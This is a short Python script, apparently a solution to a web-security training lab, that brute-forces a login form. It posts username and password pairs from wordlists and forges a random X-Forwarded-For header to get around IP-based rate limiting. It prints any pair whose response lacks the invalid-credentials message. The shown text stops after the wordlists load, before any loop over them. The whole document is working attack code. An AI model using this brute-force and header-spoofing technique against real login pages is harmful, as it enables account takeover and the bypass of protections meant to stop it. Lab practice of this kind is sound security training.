import requests
import random

def check_credentials(username, password, url):
    data = {'username': username, 'password': password}
    headers = {'X-Forwarded-For': f'127.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'}
    with requests.session() as s:
        r = s.post(url=url, data=data, headers=headers)
        if 'Invalid username or password.' not in r.text:
            print(f'{username=} : {password=}')
            return

if __name__ == '__main__':
    url = 'https://0ad400760439432a88236abf004500b0.web-security-academy.net/login'
    with open('usernames.txt', 'r') as f:
        usernames = f.read().split('\n')
    with open('passwords.txt', 'r') as f:
        passwords = f.read().split('\n')

    